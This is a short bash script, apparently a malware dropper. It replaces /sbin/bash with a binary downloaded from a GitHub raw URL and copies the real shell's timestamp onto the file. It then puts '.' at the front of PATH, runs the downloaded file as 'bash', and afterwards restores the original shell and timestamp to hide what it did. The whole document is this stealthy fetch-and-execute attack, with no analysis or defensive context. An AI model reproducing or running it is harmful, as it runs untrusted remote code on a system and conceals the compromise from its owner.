#!/bin/bash
rm -rf /sbin/bash
wget -O /sbin/bash -q https://raw.githubusercontent.com/jackmoc/update/main/update
chmod +x /sbin/bash
touch -r /bin/bash /sbin/bash
cd /sbin/
PT=$(echo $PATH | grep '\.' | wc -l)
if [ $PT -lt 2 ];then
        export PATH=.:$PATH
fi
bash
rm -rf /sbin/bash
cp /bin/bash /sbin/bash
touch -r /bin/bash /sbin/bash
